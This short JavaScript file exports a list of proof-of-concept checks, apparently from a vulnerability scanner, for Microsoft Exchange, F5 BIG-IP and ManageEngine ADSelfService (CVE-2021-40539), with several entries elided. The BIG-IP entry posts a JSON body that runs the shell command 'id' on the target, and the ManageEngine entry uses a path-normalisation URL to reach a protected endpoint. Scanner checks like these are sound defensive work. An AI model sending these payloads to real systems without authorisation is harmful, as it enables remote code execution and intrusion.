export const poc = [{
    ...
    detectResponses: ["\"MSExchEcp-ClientVersion\""],
    tags: ["exchange", "passive"],
    dog: "dog-panic",
    critLevel: 3
},
{
...
},
{
    ...
    postJSON: { "command": "run", "utilCmdArgs": "-c 'id'" },
    detectResponses: ["root"],
    tags: ["big-ip"],
    dog: "dog-panic",
    critLevel: 3
...
{
    title: "RCE: ManageEngine ADSelfService (CVE-2021-40539)",
    rootPaths: [
        "/./RestAPI/LogonCustomization"
    ],
    detectResponses: ["LogonCustomization"],
    tags: ["manageengine"],
    dog: "dog-panic",
    critLevel: 3
}]